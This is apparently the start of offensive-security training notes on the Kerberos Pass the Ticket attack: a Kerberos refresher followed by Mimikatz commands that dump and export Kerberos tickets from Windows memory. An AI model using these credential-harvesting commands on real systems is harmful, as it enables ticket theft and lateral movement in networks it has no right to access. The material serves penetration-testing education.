In this attack, we use a stolen Kerberos ticket to move laterally instead of an NTLM password hash.
# Kerberos Protocol Refresher
- The Kerberos authentication system is ticket-based.
- The `TGT - Ticket Granting Ticket` is the first ticket obtained on a Kerberos system. The TGT permits the client to obtain additional Kerberos tickets or `TGS`.
- The `TGS - Ticket Granting Service` is requested by users who want to use a service. These tickets allow services to verify the user's identity.
# Pass the Ticket (PtT) Attack
We need a valid Kerberos ticket to perform a `Pass the Ticket (PtT)`. It can be:
- Service Ticket (TGS - Ticket Granting Service) to allow access to a particular resource.
- Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.
## Harvesting Kerberos Tickets from Windows
#### Mimikatz - Export Tickets
```cmd
mimikatz.exe
```
```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```
```cmd-session
dir *.kirbi
```



